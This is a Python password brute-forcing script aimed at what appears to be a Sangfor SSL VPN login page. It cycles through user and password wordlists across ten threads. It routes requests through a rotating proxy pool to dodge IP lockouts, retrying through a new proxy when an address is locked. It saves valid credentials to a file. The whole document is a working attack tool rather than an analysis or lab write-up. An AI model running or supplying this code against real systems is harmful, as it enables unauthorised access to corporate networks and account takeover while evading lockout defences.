#-*- coding:utf-8 -*-
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import queue
import threading
import sys
import os
import re
 
sys.setrecursionlimit(10000) #修改默认递归次数 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class myThread(threading.Thread): #重写线程子类

	def __init__(self,target,args):
		threading.Thread.__init__(self)
		self.target = target
		self.args =args
		#print (self.args)

	def run(self):

		self.result = self.target(*self.args)
		
	def get_result(self):  #添加获取返回值的方法，虽然没用上
		try:
			return self.result 
		except Exception as e:
			print(e)


def get_proxy():
    return requests.get("http://{}:5010/get/".format(proxyapi)).json() #需配合https代理地址池

def get_result(self):
	try:
		return self.result 
	except Exception:
		return None


def exploit(user,dic):
	try:
		data = {"svpn_name":"{}".format(user),"svpn_password":"{}".format(dic),"svpn_rand_code":""}
		proxy = get_proxy().get("proxy")
		proxies = "https://{}".format(proxy)
		response = requests.post(url,data,proxies={"https":proxies},verify=False,timeout=10)
		verify = re.match(r'.*<Note>(.*?)</Note>',response.text).group(1)
		if verify:
			if len(verify) == 12:
				print ("\033[0;32;40m"+user,dic+ " :Done\033[0m")
				return user,dic
			 	
			elif len(verify) == 21:
				print(user,dic+" :WRONG password")
				return "wrong"

			elif len(verify) == 31:
				print(user,dic+" :IP locked")
				r = exploit(user,dic)	#IP锁了就换一个代理递归重试一次
				return r
			else:
				print(user,dic+" :SOMETHING wrong")
				r = exploit(user,dic)	#可能是验证码过期或是出现验证码的情况，递归重试
				return r
		else:
		 	print(user,dic+" :RESPONSE error")
		 	r = exploit(user,dic)
		 	return r
		
	except Exception as e:
		#print (e)
		print(user,dic+" :Proxy error")
		#if _FINISH == False:
		try:
			requests.get("http://{}:5010/delete/?proxy={}".format(proxyapi,proxy)) #代理失效从地址池删除掉
			r = exploit(user,dic)
			return r
		except Exception as e:
			pass
		
def brute(i,user,pass_queue):
	#global _FINISH
	print ("I'm thread" + str(i))
	
		#print(pass_queue.get())
		#os._exit(0)
	while not pass_queue.empty():
		passwd = pass_queue.get()

		result = exploit(user,passwd.strip())
		if result:

			if result == "wrong":			
				pass
			else:
				with open('result.txt','a+',encoding='utf-8') as f:
					f.write(result[0]+" : "+result[1] + "\r\n")
				pass_queue.queue.clear()
				break
		else:
			pass
				        
if __name__ =='__main__':
“”“
python sanforbrute_t.py https://sslvpn地址 user.txt pass.txt 127.0.0.1
”“”
	url = sys.argv[1]+"/por/login_psw.csp?type=cs&language=zh_CN&encrypt=0"
	userdic = sys.argv[2]
	passdic = sys.argv[3]
	proxyapi = sys.argv[4]
	#dic_queue = queue.Queue()

	n = 10 # threading 数量
	mythread = []
	with open(userdic,'r',encoding='utf-8') as users:  #用户字典
		for user in users:
			pass_queue = queue.Queue()
			with open(passdic,'r',encoding='utf-8') as pwds: #密码字典

				for pwd in pwds:
					pass_queue.put(pwd)
	
			for i in range(n):
				t = myThread(target=brute,args=(i,user.strip(),pass_queue))			
				t.setDaemon(True)
				mythread.append(t)
			
		for t in mythread:				
		 	t.start()

		for t in mythread:
		 	t.join()


	
